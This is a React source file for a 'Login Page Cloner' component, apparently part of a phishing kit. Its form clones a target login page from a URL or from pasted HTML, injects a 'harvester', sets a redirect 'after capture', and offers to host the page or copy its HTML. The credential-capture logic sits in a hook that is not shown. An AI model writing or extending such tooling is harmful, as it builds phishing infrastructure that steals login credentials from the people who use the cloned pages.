
'use client';

import { usePageCloner } from '@/hooks/use-page-cloner';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Globe, Wand, StopCircle, Clipboard } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Textarea } from './ui/textarea';
import { Tabs, TabsContent, TabsList, TabsTrigger } from './ui/tabs';

type LoginPageClonerProps = {
  onHostPage: (url: string) => void;
};

export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
  const { toast } = useToast();
  const { form, modifiedHtml, isProcessing, isHosting, resetState, processAndInject, hostPage } = usePageCloner(onHostPage);

  const handleCopyHtml = () => {
    if (modifiedHtml) {
      navigator.clipboard.writeText(modifiedHtml);
      toast({ title: 'Copied!', description: 'Injected HTML copied to clipboard.' });
    }
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle>Login Page Cloner</CardTitle>
        <CardDescription>Clone a page from a URL or paste HTML to inject the harvester.</CardDescription>
      </CardHeader>
      <Form {...form}>
        <form onSubmit={form.handleSubmit(processAndInject)}>
          <CardContent className="space-y-4">
            <Tabs defaultValue="url" className="w-full">
              <TabsList className="grid w-full grid-cols-2">
                <TabsTrigger value="url">Clone from URL</TabsTrigger>
                <TabsTrigger value="html">Paste HTML</TabsTrigger>
              </TabsList>
              <TabsContent value="url" className="mt-4">
                <FormField control={form.control} name="urlToClone" render={({ field }) => (
                  <FormItem>
                    <FormLabel>Target Page URL</FormLabel>
                    <FormControl><Input placeholder="https://example.com/login" {...field} value={field.value ?? ''} /></FormControl>
                    <FormMessage />
                  </FormItem>
                )} />
              </TabsContent>
              <TabsContent value="html" className="mt-4">
                <FormField control={form.control} name="htmlContent" render={({ field }) => (
                  <FormItem>
                    <FormLabel>HTML Source Code</FormLabel>
                    <FormControl><Textarea placeholder="Paste page source here..." {...field} value={field.value ?? ''} className="h-40 font-mono" /></FormControl>
                    <FormMessage />
                  </FormItem>
                )} />
              </TabsContent>
            </Tabs>
            <FormField control={form.control} name="redirectUrl" render={({ field }) => (
              <FormItem>
                <FormLabel>Redirect URL (after capture)</FormLabel>
                <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl>
                <FormMessage />
              </FormItem>
            )} />
            <Button type="submit" className="w-full" disabled={isProcessing}>
              {isProcessing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Wand className="mr-2 h-4 w-4" />}
              Process & Inject Harvester
            </Button>
          </CardContent>
          {modifiedHtml && (
            <CardFooter className="flex-col gap-4">
              <div className="w-full flex gap-2">
                <Button onClick={hostPage} disabled={isProcessing || isHosting} className="w-full">
                  {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                  Host Page
                </Button>
                <Button variant="secondary" onClick={handleCopyHtml}>
                  <Clipboard className="mr-2 h-4 w-4" />
                  Copy HTML
                </Button>
              </div>
              <Button onClick={resetState} variant="destructive" className="w-full">
                <StopCircle className="mr-2 h-4 w-4" /> Reset
              </Button>
            </CardFooter>
          )}
        </form>
      </Form>
    </Card>
  );
}
